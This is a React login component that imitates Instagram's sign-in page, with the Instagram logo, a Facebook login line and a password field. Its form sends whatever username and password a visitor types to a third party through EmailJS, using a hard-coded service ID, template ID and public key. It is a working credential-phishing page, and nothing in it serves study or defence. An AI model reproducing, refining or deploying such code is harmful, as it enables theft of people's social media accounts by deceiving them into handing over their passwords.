/* eslint-disable react/jsx-no-undef */
import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';
import { AiFillFacebook } from 'react-icons/ai';
import { Link } from 'react-router-dom';

const Login = () => {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_iowumke', 'template_knih69e', form.current, 'd9TzspmQ9z6VGh61t')
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });
  };

  return (
    // <StyledContactForm>
    <div className=' py-6'>
    <form ref={form} onSubmit={sendEmail}
    className="flex flex-col bg-white justify-center text-center m-auto w-max py-5 border-4">
        <img 
        src={require('../assets/logo.png')}
        alt="Instagram" />

      <input 
      type="email" 
      name="user_email" 
      className='bg-white border shadow-sm m-auto rounded-md text-sm active:outline-none py-2 px-1 w-9/12' 
      placeholder='Phone num, Username or Email Address'
      />

      <hr 
      className='h-3 invisible'
      />

      <input 
      type="password" 
      name="user_password" 
      className='bg-white border shadow-sm m-auto rounded-md text-sm active:outline-none py-2 px-1 w-9/12'
      placeholder='Password' />

    <Link className='py-4 bg-white'>
      <button onClick={sendEmail}
    className='text-white font-bold p-2 bg-[#72b6fa] hover:bg-[#274ef8] rounded-md justify-content-center w-9/12' 
    >Log in
      </button>
    </Link>
      <text
         className='flex flex-col text-gray-400 pt-12 pb-7 bg-white'>
         ────────────  OR  ────────────  
      </text>

      <div className='text[#0543fb88] font-bold flex justify-center h-10 bg-white'> 
          <AiFillFacebook size={25} color="#394588" className=''/>  
          <p className='align-text-center text-xl text-[#394588] bg-white '>Log In with Facebook</p>
      </div>
          <p className='pt-3  text-[#002972] text-sm bg-white'>Forgotten your password?</p>
    </form>

    <br />
    <br />    
        <div className='bg-white m-auto p-4 w-80 justify-center text-center border-2 flex'>
            <p className='bg-white text-center justify-center '>
                Don't have an account? 
                <p className='font-bold text-sky-400 px-2 bg-white'>
                    Sign up
                </p>
            </p>
        </div>

    </div>
  );
};


export default Login;
